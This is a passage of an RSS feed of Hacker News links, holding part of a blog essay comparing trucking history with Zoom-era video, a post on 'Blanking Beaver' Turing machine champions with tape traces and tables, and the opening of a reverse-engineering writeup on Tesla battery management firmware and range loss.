<figure><img src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/2560px-White_trucks_fort_riley.jpg?ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/2560px-White_trucks_fort_riley.jpg?ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>World War I trucks circa 1917, manufactured by&nbsp;<a href="https://en.wikipedia.org/wiki/White_Motor_Company">White Motor Company</a></figcaption></figure>



<p>Once the hauling freight was predictable, then new industries that couldn‚Äôt exist before emerged. The trucking industry created new modes of consumption with federated infrastructure. The big box stores, like Walmart or Costco, that couldn‚Äôt exist before were now possible (or the early 20th century parallel). As a consequence of the new modes of freight shipping creating a new possible economic model, parking lot based stores formed and the urban landscape changed. I‚Äôm extrapolated here, but I imagine a number of non-existent suburban environments formed due to this single freight based innovation. </p>



<p>The most exciting part of this to me is how the previously nascent technologies around freight positively exploded as a result of the new advancements. </p>



<p>And inline the new urban landscape fostered smaller environments that created new markets of supply and demand that didn‚Äôt previously exist. I imagine this also put stresses on areas that never expected such high throughput. I‚Äôm sure new roads needed to be developed, new laws, and in the process more and more markets emerged.</p>



<div><figure><img loading="lazy" src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Line3174_-_Shipping_Containers_at_the_terminal_at_Port_Elizabeth2C_New_Jersey_-_NOAA.jpg?resize=402%2C268&amp;ssl=1" alt="" width="402" height="268" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Line3174_-_Shipping_Containers_at_the_terminal_at_Port_Elizabeth2C_New_Jersey_-_NOAA.jpg?resize=402%2C268&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Intermodal containers waiting to be transferred between ships, trains, and trucks are stacked in holding areas at a shipping port.</figcaption></figure></div>



<p>I mention all of this because I find an interesting parallel when it comes to today and the state of what I‚Äôve been thinking about in the proliferation of video content. In relation to traditional disruption theory, we had a major event that increased the quantity of video production, without necessarily changing the cost of production. Specifically, the cost of individual video creation has transformed the way we communicate personally ‚Äì as seen through social media ‚Äì but the impact on businesses has been delayed. Given that the cost of video production had been low for quite a while, the recent societal forces around Covid turned nearly every business into a video producer.</p>



<p>I think a good parallel is to think of Zoom as being the semi-truck and the need to interact with one another during a pandemic as being the freight to haul. Naturally, as Zoom became the fix-all solution, the tool that started as a necessity became fraught with problems for specific use cases. For one, Zoom wasn‚Äôt designed for highly interactive environments or planning events ahead of time. As a result, a world wind of new applications emerged to compliment the lacking areas, such as Slidio for questions or Luma for event planning. </p>



<div><figure><img loading="lazy" src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/zoom.png?resize=405%2C219&amp;ssl=1" alt="zoom.png" width="405" height="219" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/zoom.png?resize=405%2C219&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Zoom‚Äôs usage change over one year</figcaption></figure></div>



<p>The need for higher fidelity interactions as the new normal of interacting over video was no longer a novelty. For one, people wanted to have fun. Games became a common way to spend time together, but beyond actual video games, an entire category of Zoom based games emerged. Things like <a href="https://gather.town/">GatherTown</a> or <a href="https://pluto.video/">Pluto Video</a> came to light. Similarly, as the interaction model of being online together and participating in a shared online experience was normalized, existing platforms like Figma were used for non-traditional purposes to created synchronous shared experiences. </p>



<p>I bring these examples up because I think the ones above are obviously novel ideas that won‚Äôt be valuable for extended periods of time. That being said, the seed of the novelty comes from a core experience that will likely reemerge in various places in the future.</p>



<p>Continuing with the Zoom thread, the explosion of video communication and alternative ways of communicating with video has created the explosion in video content that previously didn‚Äôt exist. Of course, there is the novelty around having this increased content ‚Äì which I believe will only continue to increase. As many things, the transition from in-person to digital was a one-way door for many industries, where the reduction in cost and surprising resilience in results has created a new normal.</p>



<p>I won‚Äôt try an exhaustive analysis around video, but one area that is particularly interesting in the machine learning space. Given the past decade, the huge improvements around computer vision, deep learning, and speech-to-text based research have been expensive and the applications have been very specific. </p>



<p>There is an exciting cross section around the sheer quantity of content being produced, and the widely accessible machine learning APIs that make it possible to analyze the content in a way that wasn‚Äôt previously possible cheaply. The novelty effect here seems ripe for misapplication. Specifically, the thing that wasn‚Äôt generally possible and the thing that previously wasn‚Äôt widely present are converging at the same time. </p>



<div><figure><img loading="lazy" src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/slider-14.jpg?resize=348%2C194&amp;ssl=1" alt="" width="348" height="194" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/slider-14.jpg?resize=348%2C194&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Real life example of an executive realizing how much money they are spending on novel tools they don‚Äôt actually use.</figcaption></figure></div>



<p>More specifically, there is a ton of video content being produced by individuals and businesses. Naturally, given the circumstances, applying the new technology to the ever growing problem seems like a good idea. Creating tooling that helps organize the new video content, or improve the reflection and recall of the content seems valuable. But is it just a novelty or a future necessity. If its a necessity, will it be a commodity and common practice, or specialize enough to demand variety in offerings?</p>



<p>Applying speech-to-text processing on video content is cheap, so analyzing everything creates a new possibility where the previously non-machine readable media is now itself a new resource that didn‚Äôt previously exist. Not only do we have video that didn‚Äôt exist before, but we have a whole category of text content that was non-existent. At the basic level, we can search video. At the more advanced level, we can quantify qualities about the video at scale. The valuable applications for this have been around phone call analysis in the past, but now are applicable to the video calls of sales teams or user interviews at product teams.</p>



<p>Again, this being the case, I find it falls to the trap of being a novel and immediately useful solution, but far from a long term value. I imagine the construct to think about the new machine readable video, is that it unlocks a new form of organizing. The ability to organize content is valuable at the surface, but the content being organized needs to be worth the effort. </p>



<p>For one, when video is being produced at scale, in the way that it is today, the shelf life of content is quite low. If you record a call for a product interview today, then when that product changes next month, the call is no longer valuable. Or at least the value of the call declines proportionally to how much the product changes. Lets call this shelf life.</p>



<div><figure><img loading="lazy" width="733" height="438" src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Frame-2.png?resize=733%2C438&amp;ssl=1" alt="" srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Frame-2.png?w=733&amp;ssl=1 733w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Frame-2.png?resize=300%2C179&amp;ssl=1 300w" sizes="(max-width: 733px) 100vw, 733px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Frame-2.png?w=733&amp;ssl=1 733w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Frame-2.png?resize=300%2C179&amp;ssl=1 300w" data-lazy-src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2021/02/Frame-2.png?resize=733%2C438&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The sales calls and user interviews from last year</figcaption></figure></div>



<p>Interestingly, as individuals ‚Äì in the social media space ‚Äì the notion of shelf life was given a sexy term: ephemerality. Since there is no cost to produce content individually, the negatives of having content with a short shelf life outweigh the positives, and among many other tings, this became a positive differentiator.</p>



<p>For businesses though, the creation of media is often far from free. Not only is the time of employees valuable, but the investment behind certain types of content are not immediately returned. So while the short shelf life video is already widely in use, the question that comes to my mind is: what are the future industries that don‚Äôt have a near term end in the road in this new space? </p>



<p>My general take is ‚Ä¶</p></div></article></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.rememberlenny.com/2021/02/13/innovation-parallels-around-trucking-and-zoom/">https://blog.rememberlenny.com/2021/02/13/innovation-parallels-around-trucking-and-zoom/</a></em></p>]]>
            </description>
            <link>https://blog.rememberlenny.com/2021/02/13/innovation-parallels-around-trucking-and-zoom/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138849</guid>
            <pubDate>Mon, 15 Feb 2021 03:51:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blanking Beavers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26138724">thread link</a>) | @nickdrozd
<br/>
February 14, 2021 | https://nickdrozd.github.io/2021/02/14/blanking-beavers.html | <a href="https://web.archive.org/web/*/https://nickdrozd.github.io/2021/02/14/blanking-beavers.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>üö∞ <em>This post is a continuation of <strong><a href="https://nickdrozd.github.io/2021/01/14/halt-quasihalt-recur.html">‚ÄúHalt, Quasihalt, Recur‚Äù</a></strong>.</em> üö∞</p>

<p><strong>Deciding whether a Turing machine is currently halted is trivial.</strong> All you have to do is check the machine‚Äôs current state. If that state is the halt state, then it‚Äôs halted. If it isn‚Äôt, then it isn‚Äôt.</p>

<p>As a <strong>termination condition</strong>, haltedness is convenient for the <strong>simulator implementor</strong>. It‚Äôs quick and it‚Äôs cheap and it‚Äôs easy. But for the <strong>Busy Beaver programmer</strong>, the requirement to halt is an onerous one. A program of <em>n</em> states and <em>k</em> colors has only <em>nk</em> transitions to work with, and one of those has to be a halt transition. The cost for detecting termination is offloaded from the simulator implementor to the programmer.</p>

<p>Suppose the simulator implementor is willing to bear the burden of detecting termination. What termination condition should be used? A machine is said to have <strong><em>quasihalted</em></strong> if it reaches a point past which <em>some and only some</em> of its internal states becomes unreachable. As a termination condition, quasihaltedness gives the programmer an enormous amount of expressivity. Unfortunately, it isn‚Äôt decidable in general whether a machine is currently quasihalted; there are programs that quasihalt but cannot be proved to quasihalt. Thus it is <strong>impossible to implement</strong> as a termination condition.</p>

<p><strong><em>Lin recurrence</em></strong> is a <strong>decidable predicate</strong>, and in theory it can be used as a termination condition. I don‚Äôt know if there is a simple, non-technical description of Lin recurrence. It was devised by <strong>Shen Lin</strong> in order to <strong><a href="https://nickdrozd.github.io/2020/12/15/lin-rado-proof.html">prove the third Busy Beaver number</a></strong>. The way it works is that on every step of the machine, a copy of the current tape contents is stored away, along with the machine‚Äôs current state and scanned color. Then on every step, every previous tape matching the current state and scanned color is compared to the current tape for the span of tape traversed between then and now. If there is a match, then the machine is said to be <strong><em>in recurrence</em></strong>. (Note that this method, the <strong>Lin algorithm</strong>, does not detect recurrence until after the recurrence has transpired for one <em>period</em>. It would be nice to able to detect recurrence as soon as it is entered.)</p>

<p>Implementing Lin recurrence as a termination condition is <strong>theoretically possible, but not practically</strong>. The Lin algorithm runs <strong>quadratic</strong> in the number steps the machine has run, meaning that a Turing machine that checks for recurrence will run slower the longer it runs. It‚Äôs like there‚Äôs a <strong>memory leak</strong>, which considering how the algorithm actually works is not so far from the truth.</p>

<p>üõÇ <strong>EXERCISE</strong> üõÇ Come up with a predicate that is <strong>feasible</strong> to implement as a termination condition for a Turing machine that does not need to be explicitly indicated by the programmer.</p>

<p>The <strong>Busy Beaver problem</strong> requires that programs be run starting on the blank tape. Ashes to ashes and dust to dust, so why not blank to blank? Just say that <strong>a machine terminates when its tape becomes blank again at some point after the first step</strong>. Call a program that leaves the tape blank a <em>blanker</em>. Or don‚Äôt. It‚Äôs not a great name.</p>

<p>The <strong>blank tape termination condition</strong> is fairly cheap to implement as a termination condition. There‚Äôs a trick to doing it right, but I won‚Äôt say what it is. Unlike haltingness, blankness doesn‚Äôt take up space in the program, although it does fatally constrain the programmer‚Äôs ability to leave anything on the tape. Remember though, we‚Äôre not talking about general Turing machine programmers here. We‚Äôre talking about <em>Busy Beaver programmers</em>, who are insane. All they‚Äôre interested in is running programs for as long as possible. Who cares what‚Äôs left on the tape? Who cares what the program does, so long as it runs for a long time?</p>

<p>Just as halting gives rise to the Busy Beaver question and as quasihalting gives rise to the <a href="https://nickdrozd.github.io/2020/10/09/beeping-busy-beaver-results.html">Beeping Busy Beaver</a> question and as Lin recurrence gives rise to a question that still needs a catchy name, so too does the blank tape condition give rise to the <strong><em>Blanking Beaver</em></strong> question: <strong>what is the longest that an <em>n</em>-state <em>k</em>-color Turing machine program can run before leaving the tape blank, in a grim reminder of the ultimate futility of all endeavors?</strong></p>

<p>üõÇ <strong>EXERCISE</strong> üõÇ Try to work out the ‚ù∑‚ë° Blanking Beaver champion <strong>by hand</strong>. Try to find the ‚ù∏‚ë° and ‚ù∑‚ë¢ champions by computer search, or by hand if you‚Äôre ambitious or bored.</p>

<p>üõÇ <strong>EXERCISE</strong> üõÇ Come up with a <strong>catchy name</strong> for the question given rise to by Lin recurrence as the termination predicate.</p>

<p>The ‚ù∏‚ë° Blanking Beaver champion program is <code>1RB 1LB 1LA 1LC 1RC 0LC</code>. It runs for <strong>34 steps</strong> before blanking the tape. Here is its tape evolution over 40 steps:</p>

<figure><pre><code data-lang="nil"> 0 A _________________________[&lt;_&gt;]________________________
 1 B _________________________&lt;#&gt;[_]_______________________
 2 A _________________________[&lt;#&gt;]#_______________________
 3 B ________________________[_]&lt;#&gt;#_______________________
 4 A _______________________[_]#&lt;#&gt;#_______________________
 5 B _______________________#[#]&lt;#&gt;#_______________________
 6 C _______________________[#]#&lt;#&gt;#_______________________  &lt;-- quasihalt
 7 C ______________________[_]_#&lt;#&gt;#_______________________
 8 C ______________________#[_]#&lt;#&gt;#_______________________
 9 C ______________________##[#]&lt;#&gt;#_______________________
10 C ______________________#[#]_&lt;#&gt;#_______________________
11 C ______________________[#]__&lt;#&gt;#_______________________
12 C _____________________[_]___&lt;#&gt;#_______________________
13 C _____________________#[_]__&lt;#&gt;#_______________________
14 C _____________________##[_]_&lt;#&gt;#_______________________
15 C _____________________###[_]&lt;#&gt;#_______________________
16 C _____________________####[&lt;#&gt;]#_______________________
17 C _____________________###[#]&lt;_&gt;#_______________________
18 C _____________________##[#]_&lt;_&gt;#_______________________
19 C _____________________#[#]__&lt;_&gt;#_______________________
20 C _____________________[#]___&lt;_&gt;#_______________________
21 C ____________________[_]____&lt;_&gt;#_______________________
22 C ____________________#[_]___&lt;_&gt;#_______________________
23 C ____________________##[_]__&lt;_&gt;#_______________________
24 C ____________________###[_]_&lt;_&gt;#_______________________
25 C ____________________####[_]&lt;_&gt;#_______________________
26 C ____________________#####[&lt;_&gt;]#_______________________
27 C ____________________#####&lt;#&gt;[#]_______________________
28 C ____________________#####[&lt;#&gt;]________________________
29 C ____________________####[#]&lt;_&gt;________________________
30 C ____________________###[#]_&lt;_&gt;________________________
31 C ____________________##[#]__&lt;_&gt;________________________
32 C ____________________#[#]___&lt;_&gt;________________________
33 C ____________________[#]____&lt;_&gt;________________________
34 C ___________________[_]_____&lt;_&gt;________________________  &lt;-- blank tape, recurrence
35 C ___________________#[_]____&lt;_&gt;________________________
36 C ___________________##[_]___&lt;_&gt;________________________
37 C ___________________###[_]__&lt;_&gt;________________________
38 C ___________________####[_]_&lt;_&gt;________________________
39 C ___________________#####[_]&lt;_&gt;________________________
40 C ___________________######[&lt;_&gt;]________________________</code></pre></figure>

<p>This program uses its first six steps and states <code>A</code> and <code>B</code> to prepare a solid block of four marks. Then it switches to state <code>C</code>, never to reach another state again (and thus quasihalting). Over the course of the subsequent 28 steps that single state is miraculously able to clear the tape.</p>

<p>The preceding program description evinces a clear <strong>subroutine structure</strong> ‚Äì first arrange for the tape block to be filled in, then switch to the wipe state and wipe it. Indeed, this program appears to have been ‚Äúconstructed‚Äù in a modular fashion. Its <code>A</code> and <code>B</code> states are identical to the ‚ù∑‚ë° halting champion, <code>1RB 1LB 1LA 1RH</code>, except that instead of halting, it transitions to the appended <code>C</code> state. The state transition graph is not <em>strongly connected</em>, contravening the <strong><a href="https://nickdrozd.github.io/2021/01/26/spaghetti-code-conjecture.html">Spaghetti Code Conjecture</a></strong>. (It isn‚Äôt a proper counterexample though, since it can be dismissed as being ‚Äúnot sufficiently large‚Äù.)</p>

<p>The <strong>‚ùπ‚ë° Blanking Beaver champion</strong> reaches the blank tape in <strong>66345 steps</strong>. That number may sound familiar, as the champions for quasihalting and Lin recurrence both terminate in <strong>66349 steps</strong>. The presumptive champion program for all three termination conditions is the same: <code>1RB 0LC 1LD 0LA 1RC 1RD 1LA 0LD</code>. The different termination conditions are intended to be different ways of measuring the amount of complexity that can be fit into a program of a certain size. The fact that these unrelated predicates all seem to point to the same program suggests that in some sense, <strong>that program really is as complex as a ‚ùπ‚ë° program can be</strong>.</p>

<p>Here are the best known values for these various sequences:</p>



<table>
  <thead>
    <tr>
      <th>Predicate</th>
      <th>Steps</th>
      <th>Program</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Quasihalt</td>
      <td>6</td>
      <td><code>1RB 1LB 1LB 1LA</code></td>
    </tr>
    <tr>
      <td>Halt</td>
      <td>6</td>
      <td><code>1RB 1LB 1LA 1RH</code></td>
    </tr>
    <tr>
      <td>Blank Tape</td>
      <td>8</td>
      <td><code>1RB 0RA 1LB 1LA</code></td>
    </tr>
    <tr>
      <td>Recurrence</td>
      <td>9</td>
      <td><code>1RB 0LB 1LA 0RB</code></td>
    </tr>
  </tbody>
</table>



<table>
  <thead>
    <tr>
      <th>Predicate</th>
      <th>Steps</th>
      <th>Program</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Halt</td>
      <td>21</td>
      <td><code>1RB 1RH 1LB 0RC 1LC 1LA</code></td>
    </tr>
    <tr>
      <td>Blank Tape</td>
      <td>34</td>
      <td><code>1RB 1LB 1LA 1LC 1RC 0LC</code></td>
    </tr>
    <tr>
      <td>Quasihalt</td>
      <td>55</td>
      <td><code>1RB 0LB 1LA 0RC 1LC 1LA</code></td>
    </tr>
    <tr>
      <td>Recurrence</td>
      <td>101</td>
      <td><code>1RB 1LB 0RC 0LA 1LC 0LA</code></td>
    </tr>
  </tbody>
</table>



<table>
  <thead>
    <tr>
      <th>Predicate</th>
      <th>Steps</th>
      <th>Program</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Halt</td>
      <td>38</td>
      <td><code>1RB 2LB 1RH 2LA 2RB 1LB</code></td>
    </tr>
    <tr>
      <td>Quasihalt</td>
      <td>59</td>
      <td><code>1RB 2LB 1LA 2LB 2RA 0RA</code></td>
    </tr>
    <tr>
      <td>Blank Tape</td>
      <td>77</td>
      <td><code>1RB 2LA 0RB 1LA 0LB 1RA</code></td>
    </tr>
    <tr>
      <td>Recurrence</td>
      <td>165</td>
      <td><code>1RB 0LA ... 1LB 2LA 0RB</code></td>
    </tr>
  </tbody>
</table>



<table>
  <thead>
    <tr>
      <th>Predicate</th>
      <th>Steps</th>
      <th>Program</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Halt</td>
      <td>107</td>
      <td><code>1RB 1LB 1LA 0LC 1RH 1LD 1RD 0RA</code></td>
    </tr>
    <tr>
      <td>Blank Tape</td>
      <td>66345</td>
      <td><code>1RB 0LC 1LD 0LA 1RC 1RD 1LA 0LD</code></td>
    </tr>
    <tr>
      <td>Quasihalt</td>
      <td>66349</td>
      <td><code>1RB 0LC 1LD 0LA 1RC 1RD 1LA 0LD</code></td>
    </tr>
    <tr>
      <td>Recurrence</td>
      <td>66349</td>
      <td><code>1RB 0LC 1LD 0LA 1RC 1RD 1LA 0LD</code></td>
    </tr>
  </tbody>
</table>

<p><strong>Computability theory</strong> tells us that the quasihalting sequence must eventually dominate the halting sequence. Additionally, it‚Äôs almost certainly the case that the recurrence and blank tape sequences also dominate the halting sequence, but that has not been proved. All that said, no values have been found that beat the halting sequence for the ‚ù∫‚ë° and ‚ù∑‚ë£ cases. <strong>Finding new champions will not be easy.</strong></p>

<p>üõÇ <strong>EXERCISE</strong> üõÇ This post makes <strong>two major changes to previously used terminology</strong>. What are the changes, and why were they made?</p>

<p>üõÇ <strong>EXERCISE</strong> üõÇ Fill in the following table to show the <strong>resource access</strong> required to implement each termination predicate:</p>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Halt</th>
      <th>Quasihalt</th>
      <th>Recurrence</th>
      <th>Blank Tape</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Mac‚Ä¶</strong></td></tr></tbody></table></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nickdrozd.github.io/2021/02/14/blanking-beavers.html">https://nickdrozd.github.io/2021/02/14/blanking-beavers.html</a></em></p>]]>
            </description>
            <link>https://nickdrozd.github.io/2021/02/14/blanking-beavers.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138724</guid>
            <pubDate>Mon, 15 Feb 2021 03:29:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Explaining Tesla Changes Post-Firmware 2019.16 Regarding Range Loss]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26138644">thread link</a>) | @STRML
<br/>
February 14, 2021 | https://skie.net/skynet/projects/tesla/view_post/23_Explaining+Changes+post-firmware+2019.16+Regarding+Range+Loss | <a href="https://web.archive.org/web/*/https://skie.net/skynet/projects/tesla/view_post/23_Explaining+Changes+post-firmware+2019.16+Regarding+Range+Loss">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><b><span size="4">NOTE</span></b></p><p>This writeup and its accompanying images are Copyright 2021 - Jason Hughes, All rights reserved.&nbsp; No portion of this content may be copied or distributed outside of this site without my express written permission.&nbsp; If you wish to disseminate this information, you may do so in the form of a direct link to this writeup.</p><p>I'm posting this on my own (outdated) site for personal reasons (some noted below).</p><p>---</p><p><b><u><span size="4">I will preface all of this with a bit of a disclaimer</span></u></b></p><p>First, 99.9% of the information here is derived from first hand reverse engineering of Tesla‚Äôs BMS, BMS firmware, and other aspects of the Tesla vehicles.&nbsp; Reverse engineering is not an exact science, as in, you don‚Äôt get the exact code used to create the software out of the process, and obviously the developer‚Äôs commentary/comments are not available either.&nbsp; Much of what is derived relies on some logical interpretation to determine the intended functionality of particular code.&nbsp; While there is a lot of human-readable text in some parts of the code, this isn‚Äôt always the case.</p><p>I‚Äôve been working on hardware and software design, including reverse engineering of the same, for the better part of 20 years now.&nbsp; While I have extensive knowledge and experience, I don‚Äôt personally consider myself to be an expert in the field.&nbsp; Many others definitely disagree, and do consider me to be an expert.</p><p>All of that said, what I‚Äôm mainly trying to convey is that I‚Äôm definitely not perfect.&nbsp; It‚Äôs quite possible my interpretation of how all of this works has flaws, and my speculation as to the intention of the developers may also be flawed.&nbsp; I do believe this information is as correct as possible given the information available, however, and is likely the most complete picture that will be available.</p><p>I‚Äôll also note that this is a pretty technical explanation of the situation, and some background knowledge of the general topic and technology will be needed to fully understand.&nbsp; I‚Äôll go over some of the background info that is situation-specific, but you‚Äôll likely have to do your own research to fill in any gaps in your knowledge.</p><p>If I jump around a lot, my apologies.&nbsp; I'm also not the best writer, overall.&nbsp;&nbsp;I have a lot of information I'm trying to condense into a single writeup here, with lots of connections between the various content.</p><p>Finally, I‚Äôll make a blanket note that nothing here has anything to do with any battery fires or safety issues.&nbsp; In a worst case scenario, unmitigated Condition X or Z results in the vehicle being unusable.&nbsp; In no instance is either situation responsible for fires or other safety concerns.</p><p>---</p><p>Quick background.&nbsp; Over a year ago I discovered some interesting mechanics in the Tesla BMS code.&nbsp; At the time, it was in my best interest to not publicly disclose those findings in their entirety, so I dubbed the issues the code was attempting to mitigate ‚ÄúCondition X‚Äù and ‚ÄúCondition Z‚Äù.&nbsp; You can read more about that in a <a href="https://teslamotorsclub.com/tmc/posts/3719582/">megathread on TMC</a>, if you like, but suffice it to say:</p><p><b>Condition X</b>: A stuck balancing MOSFET (or other similar drain on a single cell group)</p><p><b>Condition Z</b>: Measurement accuracy failure on cell group (BMB sense failure, corrosion, mechanical PCB failure, etc)</p><p><u><b><span size="4">Some required background knowledge and definitions</span></b></u></p><p><img src="https://057tech.com/pimages/batterypackpi.jpg"><br></p><p><i><span size="1">Image: Opened 85 kWh Battery Pack (C)&nbsp;<a href="https://057tech.com/">057 Technology, LLC</a>, Jason Hughes</span></i><br></p><p>Tesla Model S and X battery ‚Äúpacks‚Äù, as of the time of this writing, consist of 14 ot 16 ‚Äúmodules‚Äù.&nbsp; Each module is made of 6 ‚Äúbricks‚Äù of 74 ‚Äúcells‚Äù. (There are some exceptions to this, but not important here.)&nbsp; The cells in each brick are connected in parallel.&nbsp; The bricks are connected to other bricks within a module in series.&nbsp; The modules themselves are connected in series to form a pack.&nbsp; This results in most packs having 96 cell groups in series.&nbsp; (For more basic definitions, consult your favorite search engine.)</p><p>Each pack module has a BMB (Battery Management Board) attached which monitors the voltage of each brick on that module, can bleed energy at a slow rate from each brick individually when needed for balancing, along with some temperature probes.&nbsp; The BMBs are connected to the main BMS (Battery Management System) at the rear of the pack which controls the bulk of the functionality of the battery‚Äôs monitoring and safety systems.</p><p>The BMBs can only discharge cell groups, they can not move energy from one cell group to another or otherwise charge any cell group.&nbsp; This is active balancing, but not charge shuffling.&nbsp; The cells with the highest voltage get their balancer circuits enabled in order to bring their voltage down and in line with the rest of the cell groups within a battery pack.</p><p>Keeping a large lithium ion battery with many cells in series in balance is critical for the safety, reliability, and longevity of the battery pack.&nbsp; I won‚Äôt get into all of the details on why this is the case here, but information on this is widely available.</p><p>---</p><p><u><b><span size="4">Onward to explanations</span></b></u></p><p><b><u><span size="4">Early 2019</span></u></b></p><p>Tesla started adding a bunch of problem detection code to the BMS sometime in early 2019.&nbsp; To me, the bulk of this seemed very preemptive, as-in nothing they were looking for had presented itself in the wild to the best of my knowledge.&nbsp; There are tons of things the BMS checks for that I personally never would have even thought of.&nbsp; Kudos to the engineers on this.&nbsp; It‚Äôs a remarkable feat for sure.</p><p>One of those problem detectors was to detect ‚ÄúCondition X‚Äù, a stuck MOSFET on a BMS resulting in a perpetual imbalance of a cell group.&nbsp; This seems like a sensible thing to look for.&nbsp; With hundreds of millions of these tiny MOSFETs in the wild, it‚Äôs only a matter of time before one fails closed and causes a problem.</p><p>Back when I initially started to see the code and algorithms for Condition X detection and mitigation (through ongoing reverse engineering), I was alarmed.&nbsp; It seemed to me that Tesla was trying to hide a BMS failure/flaw at the expense of customer usability.&nbsp; Since this came about the same time as the now infamous range loss update, and since Condition Z was not yet known, it also seemed like this was a much more widespread problem than it really was.</p><p>Further, my analysis of the code, along with influence from the media around amplifying a handful of vehicle fires, lead me to some incorrect conclusions about the function of some of the code (see my preface).&nbsp; At the time, I misinterpreted a part of the algorithm and thought that they may be mitigating some kind of unexplained voltage _rise_ in a cell group, which could be catastrophic.&nbsp; There‚Äôs no evidence this is the case.&nbsp; This line of thought was purely human error on my part when missing the sign bit on a section of reverse engineered code (if you‚Äôre not a programmer I suggest you skip understanding this explanation, accept it was a trivial error on my part, and move on).</p><p>Based on this, I pretty hastily posted publicly that there may be an issue, and it may be a safety issue.&nbsp; This definitely got some attention on the range loss issue.</p><p>I began examining and piecing together the code more closely, and eventually I realized that the code was trying to detect an unexplained voltage _drop_ in a cell group, not a rise (from a stuck MOSFET).&nbsp; This was bad, but definitely way better than what I had originally interpreted.&nbsp; An unexplained drop could result in the loss of use of the battery pack, perpetual imbalance, etc.</p><p>After seeing a slew of updates with new BMS code coming down the line, I took a step back and tried to see the bigger picture.&nbsp; Finally the distinction between Condition X and Z became apparent.</p><p><b><u><span size="4">Conditions X and Z</span></u></b></p><p>I eventually made some followup tweets and TMC posts about the issue, but after getting some mostly unsolicited but solid advice on the matter, along with some professional courtesy and general CYA thinking, I decided not to detail exactly what I believed the conditions were.&nbsp; It was obvious to me that the engineers were working hard to figure this out and come up with a solution.&nbsp; It didn‚Äôt make sense to push people in the wrong direction on this and cause more problems all around.&nbsp; At the time there was no mitigation in place for Condition Z, so it wouldn‚Äôt do any good to know about it anyway.&nbsp; My suggestion to the community was to just update, make sure you don‚Äôt get stranded, and wait it out.</p><p>(Some trivial info: I decided on Condition X and Condition Z based on the way engineers were doing various things in the BMS code related to the different algorithms.&nbsp; My hope was that should a Tesla BMS engineer see my notes, they‚Äôd make the association.&nbsp; Never confirmed either way.)</p><p><b><u><span size="4">X</span></u></b></p><p>If a battery pack has ‚ÄúCondition X‚Äù, a stuck MOSFET on a balancer circuit, this is very bad.&nbsp; If the balancer circuit is stuck on, the BMB is always going to be draining power from that cell group.&nbsp; The end result is that balancing the battery pack is now completely impossible.</p><p>Why? Because now no cell group can ever be brought to a lower voltage than the group with the stuck balancer circuit.&nbsp; The BMS now has to enable ALL of the remaining balancers in order to bring the rest of the battery pack back as close as possible to with the group that is too low.&nbsp; This results in a loss of range for multiple reasons: parasitic/vampire drain (roughly 1% SoC per day); and since the lowest point possible to discharge to has now been raised for all cells due to the lowest cell always being lower than the rest of the pack.&nbsp; It will eventually result in complete failure of the pack as the imbalance grows beyond acceptable limits, especially if the vehicle is left sitting idle for extended periods.&nbsp; To my knowledge, there have been no non-contrived examples of this in the wild.</p><p>Given the amount of vehicles quickly ‚Äúdetecting‚Äù Condition X, it was obvious a stuck MOSFET couldn‚Äôt explain the triggering.&nbsp; Additionally, the bulk of those detections (in my testing and research) were triggering for the 6th cell group, and not randomly distributed.&nbsp; It also was not being detected at all in newer packs, nor in the oldest of packs, 